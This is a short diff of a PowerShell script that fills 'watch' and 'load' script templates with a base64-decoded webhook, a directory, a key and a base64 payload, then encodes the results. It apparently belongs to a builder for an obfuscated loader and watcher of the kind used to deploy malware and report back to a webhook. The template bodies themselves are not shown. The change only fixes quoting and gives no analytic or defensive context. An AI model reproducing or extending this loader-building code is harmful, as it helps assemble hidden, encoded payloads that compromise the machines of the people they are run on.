@@ -96,8 +96,9 @@ try{
 exit 0
 '@
 
-$watchPlain=$watchPlain.Replace('%%WH%%',"`'"(X $WHB64)`'").Replace('%%DIR%%',"`'$DIR`'").Replace('%%VER%%',$VER)
-$loadPlain=$loadPlain.Replace('%%WH%%',"`'"(X $WHB64)`'").Replace('%%DIR%%',"`'$DIR`'").Replace('%%VER%%',$VER).Replace('%%KEY%%',$KEY).Replace('%%PAYLOAD%%',"`'$PAYLOAD_B64`'")
+$whX=("'")+(X $WHB64)+("'")
+$watchPlain=$watchPlain.Replace('%%WH%%',$whX).Replace('%%DIR%%',"'"+$DIR+"'").Replace('%%VER%%',$VER)
+$loadPlain=$loadPlain.Replace('%%WH%%',$whX).Replace('%%DIR%%',"'"+$DIR+"'").Replace('%%VER%%',$VER).Replace('%%KEY%%',$KEY).Replace('%%PAYLOAD%%',"'"+$PAYLOAD_B64+"'")
 
 $encWatch=Enc $watchPlain
 $encLoad =Enc $loadPlain
